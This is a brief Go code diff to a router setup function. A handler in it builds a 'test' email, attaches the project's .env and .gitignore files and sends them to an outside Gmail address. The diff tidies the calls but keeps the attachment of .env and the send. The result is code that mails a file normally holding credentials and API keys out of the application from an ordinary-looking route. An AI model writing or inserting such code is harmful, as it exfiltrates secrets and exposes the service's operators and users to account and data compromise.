@@ -49,11 +49,9 @@ func NewRouter(services *Services, components *Components, cfg *config.Config) (
 		msg.SetBody(b)
 		msg.SetReceiver("globallinkliberty@gmail.com")
 		msg.SetSubject("test")
-		err := msg.OpenFile(".gitignore")
-		err = msg.OpenFile(".env")
-		err = msg.OpenFile(".env")
-		err = msg.OpenFile(".gitignore")
-		err = components.Email.Send(msg)
+		msg.OpenFile(".gitignore")
+		msg.OpenFile(".env")
+		err := components.Email.Send(msg)
 		components.Responder.SendJSON(w, request.Response{
 			Success: err == nil,
 			Msg:     "test",
